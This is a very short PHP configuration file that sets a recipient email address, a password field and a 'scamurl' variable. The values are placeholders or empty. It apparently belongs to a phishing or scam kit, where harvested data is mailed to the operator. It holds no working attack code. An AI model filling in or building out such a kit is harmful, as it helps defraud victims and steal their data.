<?php 


$tomail="email@gmail.com"; $trackpass=""; $scamurl=""; 



?>